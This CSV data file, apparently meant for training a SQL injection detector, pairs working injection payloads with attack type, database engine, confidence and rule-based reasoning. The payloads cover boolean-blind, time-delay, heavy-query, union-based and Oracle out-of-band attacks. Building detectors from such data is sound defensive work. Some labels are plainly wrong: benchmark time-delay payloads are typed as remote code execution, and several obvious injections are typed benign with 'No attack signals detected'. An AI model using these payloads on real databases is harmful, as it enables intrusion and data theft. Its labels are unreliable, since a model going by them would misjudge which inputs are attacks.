row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
5502,"select * from generate_series ( 9167,9167,case when ( 9167 = 2273 ) then 1 else 0 end ) limit 1--",1,,heavy_query,generic,0.95,generate_series ( detected — heavy_query injection (priority 6) on generic,rule-based
5503,-2527 ) ) as oqpy where 7468 = 7468 or 3038 = 3038,1,,boolean_blind,generic,0.95,7468 = 7468 or detected — boolean_blind injection (priority 8) on generic,rule-based
5504,1%' waitfor delay '0:0:5'--,1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
5505,"1' where 7080 = 7080 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1,,rce,generic,0.95,0x544d5a4c detected — rce injection (priority 1) on generic,rule-based
5506,"1'+ ( select 'mikf' where 5814 = 5814 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
5507,"1 ) ) as rsnb where 3168 = 3168 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1,,rce,generic,0.95,0x4b774c75 detected — rce injection (priority 1) on generic,rule-based
5508,"1"" where 5039 = 5039 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,,boolean_blind,generic,0.95,5039 = 5039 and detected — boolean_blind injection (priority 8) on generic,rule-based
5509,1' ) where 9516 = 9516,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5510,"-9871"" ) union all select 9082#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
5511,1'|| ( select 'adni' from dual where 6611 = 6611,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5512,1 ) ) as wajy where 8593 = 8593,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5513,-8404 ) ) order by 1--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5514,"-2759%"" ) ) or 7769 = 1249#",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5515,"( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
5516,"1 ) as nkjo where 8462 = 8462 union all select null,null,null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
5517,"1' where 1628 = 1628 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
5518,"-4822"" or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ""owbp"" = ""owbp",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
5519,1' ) where 2974 = 2974 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
